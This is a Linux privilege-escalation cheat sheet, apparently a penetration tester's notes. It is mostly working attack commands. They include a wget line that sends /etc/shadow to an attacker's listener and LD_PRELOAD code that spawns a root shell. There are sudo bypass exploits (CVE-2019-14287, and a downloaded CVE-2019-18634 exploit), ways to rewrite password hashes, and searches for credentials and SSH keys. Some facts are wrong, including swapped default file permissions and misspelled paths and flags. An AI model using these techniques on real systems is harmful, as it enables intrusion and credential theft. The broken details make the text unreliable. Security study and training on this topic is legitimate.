# Techniques

## Kernel exploits

Enumerate the kernel version:

```text
uname -a 
cat /etc/issue
```

Then use searchsploit / linux-exploit-suggester / google to find matching exploits:

```text
searchsploit linux kernel <version> priv esc

# or you can use https://github.com/jondonas/linux-exploit-suggester-2
./linux-exploit-suggester-2.pl -k <version>
```

## Service exploits

Firstly enumerate processes running as root.

```text
ps aux | grep "^root"
netstat -nl
```

Then enumerate their versions.

```text
<service> -v
<service> --version
dpkg -l | grep <service>
rpm -qa | grep <service>
```

Search for exploits for enumerated software versions.

## Stored secrets / weak file permissions

Always search through history files.

```text
history
cat ~/.bash_history
cat ~/*_history
```

Also search for files containing "password", "pass", "pwd".

```text
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

Don't overlook possible interesting files and directories with bad permissions.

```text
# Find all writable files in /etc: 
find /etc -maxdepth 1 -writable -type f

# Find all readable files in /etc: 
find /etc -maxdepth 1 -readable -type f

# Find all directories which can be written to:
find / -executable -writable -type d 2> /dev/null
```

### /etc/shadow \(default: -rw-r--r--\)

Things you can do:

1. If a file is readable, you can try to crack root hash.
2. If a file is writable, you can replace original hash.

{% page-ref page="../../password-attacks/cracking-hashes-1.md" %}

You can generate new sha-512 \("$6$"\) hash of a password with this command.

```text
mkpasswd -m sha-512 <newpassword>
```

### /etc/passwd \(default: -rw-------\)

Things you can do when the file is writable:

1. Deleting `x` , can disable password on older systems.
2. Replacing `x` with a new password hash generated by `openssl passwd "<newpassword>"` .
3. Append new user with UID 0, but different username.

### SSH keys \(id\_rsa / authorized\_keys\)

```text
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
```

### Backups

Look for interesting files, also backups can be found in these locations.

```text
ls -la /
ls -la /tmp
ls -la /var/backups
```

## Sudo misconfigurations

Sudo is used to run programs as an another user, by default it's root.

```text
sudo -u <user> <program>
```

You can list programs which can be run without requiring password.

```text
sudo -l
```

Some ways to escalate privileges with unrestricted sudo:

```text
sudo -s
sudo -i
sudo /bin/bash
sudo passwd
```

Shell escape sequences can be found here: [https://gtfobins.github.io/](https://gtfobins.github.io/)

### "Intended functionality"

Some program's intended functionality can also help you to escalate privileges. Always google for possible privilege escalations using programs you have access to.

#### apache2 example

When you run apache as a root, you can provide configuration file with a `-f` flag. When a file is not in correct format, apache2 will print first line of a file in error message. We can use this to read first line of a `/etc/shadow` file \(root's hash\) and crack it.

```text
sudo apache2 -f /etc/shadow
```

#### wget example

Wget command can not only download files, but also post files to webserver.

You can setup netcat listener on your machine and then by running this command on target machine, will send `/etc/shadow` your way.

```text
sudo wget --post-file=/etc/shadow <LHOST>:<LPORT>
```

### LD\_PRELOAD

When LD\_PRELOAD enviroment variable is set and you run the executable, ld will first run specified library and only after that will execute original program. 

Firstly we create source code file for a shared object.

{% code title="shell.c" %}
```c
#inclu-de <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init(){
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash"); // "cp /bin/bash /tmp/yzbash; chmod +s /tmp/yzbash"
}
```
{% endcode %}

Then compile this C code as a shared object.

```text
gcc -fPIC -shared -o shell.so shell.c -nostartfile
```

Preload this shared object when you run executable you have permission to run with sudo.

```text
sudo LD_PRELOAD=<path_to_your_so_file> <executable_you_can_run_with_sudo>
```

### CVE-2019-14287

If your user has disabled access to some executable.

```text
user ALL=(ALL,!root) /bin/bash
```

With ALL specified, user can run the binary `/bin/bash` as any user \(not only root user, other user id's works too\).

```text
sudo -u#-1 /bin/bash
```

### CVE-2019-18634

When `pwfeedback` is set in a specific versions of sudo \(&lt;1.8.25p\), we can trigger stack-based buffer overflow. Exploiting the bug does not require sudo permissions, merely that `pwfeedback` be enabled.

```text
Matching Defaults entries for user on linux-build:
insults, pwfeedback, mail_badpass, mailerpath=/usr/sbin/sendmail

User user may run the following commands on linux-build:
(ALL : ALL) ALL
```

The bug can be reproduced by passing a large input to sudo via a pipe when it prompts for a password.

```text
wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c -O exploit.c
gcc -o exploit exploit.c
./exploit
```

## Cron jobs

Crons are located in:

```text
/var/spool/cron/
/var/spool/cron/crontabs/
/etc/crantab
```

The crontab PATH environment variable is by default set to `/usr/bin:/bin`

## SUID / SGID files

```text
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;2> /dev/null
find / -user <user> -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

```text
https://github.com/Anon-Exploiter/SUID3NUM
```

```text
# Running strings against a file:
strings <file>

# Running strace against a command:
strace -v -f -e execve <command> 2>&1 | grep exec

# Running ltrace against a command:
ltrace <command>
```

